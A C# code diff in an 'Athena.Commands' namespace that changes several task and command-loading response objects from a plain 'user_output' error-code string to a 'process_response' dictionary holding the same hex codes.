@@ -72,7 +72,7 @@ namespace Athena.Commands
                         return new ResponseResult
                         {
                             task_id = job.task.id,
-                            user_output = "0x18",
+                            process_response = new Dictionary<string, string> { { "message", "0x18" } },
                             completed = true,
                             status = "error"
                         }.ToJson();
@@ -83,7 +83,7 @@ namespace Athena.Commands
                 return new ResponseResult
                 {
                     task_id = job.task.id,
-                    user_output = "0x19",
+                    process_response = new Dictionary<string, string> { { "message", "0x19" } },
                     completed = true
                 }.ToJson();
 
@@ -111,7 +111,7 @@ namespace Athena.Commands
                 return new ResponseResult()
                 {
                     completed = true,
-                    user_output = "0x20",
+                    process_response = new Dictionary<string, string> { { "message", "0x20" } },
                     task_id = job.task.id,
                 }.ToJson();
             }
@@ -123,7 +123,7 @@ namespace Athena.Commands
                 return new ResponseResult()
                 {
                     completed = true,
-                    user_output = "0x1A",
+                    process_response = new Dictionary<string, string> { { "message", "0x1A" } },
                     task_id = job.task.id,
                 }.ToJson();
             }
@@ -179,7 +179,7 @@ namespace Athena.Commands
                 {
                     task_id = job.task.id,
                     completed = true,
-                    user_output = "0x1B"
+                    process_response = new Dictionary<string, string> { { "message", "0x1B" } },
                 }.ToJson();
             }
             catch (Exception e)
@@ -201,7 +201,7 @@ namespace Athena.Commands
                 return new LoadCommandResponseResult
                 {
                     completed = true,
-                    user_output = "0x1C",
+                    process_response = new Dictionary<string, string> { { "message", "0x1C" } },
                     task_id = task_id,
                     status = "error"
                 }.ToJson();
@@ -220,7 +220,7 @@ namespace Athena.Commands
                         return new LoadCommandResponseResult()
                         {
                             completed = true,
-                            user_output = "0x1D",
+                            process_response = new Dictionary<string, string> { { "message", "0x1D" } },
                             task_id = task_id,
                             commands = new List<CommandsResponse>()
                                 {
@@ -237,7 +237,7 @@ namespace Athena.Commands
                 return new LoadCommandResponseResult()
                 {
                     completed = true,
-                    user_output = "0x1E",
+                    process_response = new Dictionary<string, string> { { "message", "0x1E" } },
                     task_id = task_id,
                     status = "error",
                     commands = new List<CommandsResponse>(),
@@ -264,7 +264,7 @@ namespace Athena.Commands
             return new LoadCommandResponseResult()
             {
                 completed = true,
-                user_output = "0x1F",
+                process_response = new Dictionary<string, string> { { "message", "0x1F" } },
                 task_id = job.task.id,
                 commands = unloaded,
             }.ToJson();
